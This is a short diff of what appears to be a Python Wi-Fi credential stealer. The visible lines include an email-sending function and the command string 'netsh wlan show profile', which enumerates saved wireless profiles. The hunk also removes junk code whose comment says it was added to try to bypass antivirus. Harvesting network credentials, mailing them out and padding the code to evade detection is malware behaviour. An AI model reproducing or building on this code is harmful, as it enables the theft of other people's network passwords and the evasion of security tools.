@@ -7,12 +7,7 @@ def send_email(mail, password, message):
     host.sendmail(mail,mail,message)
     host.quit()
 
- #irrelevent code just to try bypass antiviress 
-def amount(x,y, sum):
-    sum = x + y
-    sum = sum - 5
-    return sum
-# end
+
 
 
 c1  = "netsh wlan show profile"
